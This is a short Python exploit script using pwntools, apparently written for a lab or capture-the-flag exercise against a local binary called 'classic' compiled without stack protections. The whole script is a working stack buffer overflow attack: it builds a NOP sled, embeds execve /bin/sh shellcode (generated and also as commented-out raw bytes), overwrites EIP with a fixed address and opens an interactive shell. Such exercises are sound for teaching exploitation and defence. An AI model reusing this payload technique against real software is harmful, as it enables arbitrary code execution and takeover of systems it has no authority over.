from pwn import *

#Update the Context with the Architecture and OS
context.update(arch="i386", os="linux")

#Create a Process Object to talk to. This should be our Target Binary
p = process("./classic")

# Do an initial read to get the welcome message
data = p.read()
print(data)  #For Debugging

raw_input("Attach GDB and press enter")  #More debugging


# And add our Shellcode

#shellcode ="".join(["\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46",
#                   "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68",
#                   "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"])

#shellcode = "".join(["\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70",
#		     "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61",
#		     "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52",
#		     "\x51\x53\x89\xe1\xcd\x80"])
shellcode = asm(shellcraft.sh())
print(shellcraft.sh())


# Offset to EIP (You need to calculate this)
OFFSET = 236

#Address we want to jump to (You need to supply this)
#Pwntools will automatically convert to the correct endianness
#TARGET_ADDRESS = p32(0xffffd080)
TARGET_ADDRESS = p32(0x0804901d)
#TARGET_ADDRESS = "BBBB"


#Now we will build our payload

PADD = 150
payloadLen = OFFSET - len(shellcode) #How many 'A's to Pad with
payloadLen = payloadLen - PADD #I like a bit of space below the shellcode too

payload = "\x90"*payloadLen
payload += shellcode  #Add Shellcode
payload += "\x90"*PADD#30  #More Nops
payload += TARGET_ADDRESS #Address to Jump to

print("PAYLOAD {0} \n{1}".format(payload, len(payload)))
p.writeline(payload)  #Write it to the Binary
p.interactive() #Go into interactive mode.

#34 is OK,  > 34 Crashses



#Compile With
#gcc -m32 -fno-stack-protector -z execstack -no-pie classic.c -o classic

